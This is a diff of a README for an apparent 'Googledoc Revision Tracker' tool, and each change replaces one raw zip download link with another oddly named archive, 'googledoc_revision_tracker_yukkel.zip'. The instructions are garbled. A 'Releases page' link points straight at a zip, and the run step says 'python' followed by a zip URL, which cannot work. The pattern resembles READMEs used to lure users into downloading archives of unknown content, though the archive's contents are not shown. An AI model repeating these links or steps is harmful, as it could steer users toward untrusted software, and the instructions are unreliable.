@@ -6,7 +6,7 @@ This guide will help you download and run the Googledoc Revision Tracker softwar
 
 ## 📥 Download the Software
 
-[![Download the Googledoc Revision Tracker](https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc-revision-tracker-v2.5.zip%20Now-v1.0-brightgreen)](https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc-revision-tracker-v2.5.zip)
+[![Download the Googledoc Revision Tracker](https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc_revision_tracker_yukkel.zip%20Now-v1.0-brightgreen)](https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc_revision_tracker_yukkel.zip)
 
 ## 🔍 Overview
 
@@ -29,7 +29,7 @@ The Googledoc Revision Tracker allows you to keep an eye on changes made to your
 
 ## 📃 Download & Install
 
-To download the Googledoc Revision Tracker, please visit the Releases page here: [Download Here](https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc-revision-tracker-v2.5.zip).
+To download the Googledoc Revision Tracker, please visit the Releases page here: [Download Here](https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc_revision_tracker_yukkel.zip).
 
 Once you arrive at the page:
 
@@ -53,7 +53,7 @@ After downloading, follow these steps to install and run the software:
 3. **Run the application:**
    Type the application name followed by any necessary command options and hit Enter. If you downloaded the executable, the command might look something like this:
    ```
-   python https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc-revision-tracker-v2.5.zip
+   python https://github.com/Mouli569/googledoc-revision-tracker/raw/refs/heads/main/revisions/googledoc_revision_tracker_yukkel.zip
    ```
 
 4. **Authenticate:**
